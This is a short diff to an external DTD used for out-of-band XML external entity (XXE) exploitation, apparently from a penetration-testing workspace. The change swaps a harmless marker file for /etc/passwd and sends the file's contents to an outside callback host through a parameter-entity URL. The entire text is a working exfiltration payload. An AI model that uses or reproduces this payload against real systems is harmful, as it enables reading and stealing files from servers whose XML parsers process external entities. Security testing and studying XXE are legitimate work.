@@ -1,4 +1,4 @@
-<!ENTITY % f SYSTEM "file:///home/kali/workspace/i017/evidence/oob_marker.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil?d=%f;'>">
+<!ENTITY % f SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil-passwd?d=%f;'>">
 %eval;
 %exfil;
